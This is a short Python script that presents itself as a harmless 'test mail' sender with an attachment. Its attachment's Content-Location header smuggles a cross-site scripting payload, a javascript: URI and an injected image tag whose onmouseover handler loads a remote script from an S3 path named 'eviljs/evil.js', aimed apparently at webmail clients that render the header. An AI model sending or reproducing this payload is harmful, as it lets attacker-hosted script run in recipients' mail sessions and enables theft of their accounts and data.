import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
mail_content = '''Hello,
This is a test mail.
In this mail we are sending some attachments.
The mail is sent using Python SMTP library.
Thank You
'''
#The mail addresses and password
sender_address = ''
sender_pass = ''
receiver_address = ''
#Setup the MIME
message = MIMEMultipart()
message['From'] = sender_address
message['To'] = receiver_address
message['Subject'] = 'A test mail sent by Python. It has an attachment.'
#The subject line
#The body and the attachments for the mail
message.attach(MIMEText(mail_content, 'plain'))
attach_file_name = 'attachment.txt'
attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
payload = MIMEBase('application', 'file_dinh_kem')
payload.set_payload((attach_file).read())
encoders.encode_base64(payload) #encode the attachment
#add payload header with filename
payload.add_header('Content-Transfer-Encoding', 'base64')
payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
payload.add_header('Content-Location', "javascript:alert(1)'></a><img src=a onmouseover=alert(123);window.x.src='https://s3-eu-west-1.amazonaws.com/eviljs/evil.js'><a href='")
message.attach(payload)
#Create SMTP session for sending the mail
session = smtplib.SMTP_SSL('smtp.viettel.com.vn', 465) #use gmail with port
session.login(sender_address, sender_pass) #login with mail_id and password
text = message.as_string()
session.sendmail(sender_address, receiver_address, text)
session.quit()
print('Mail Sent')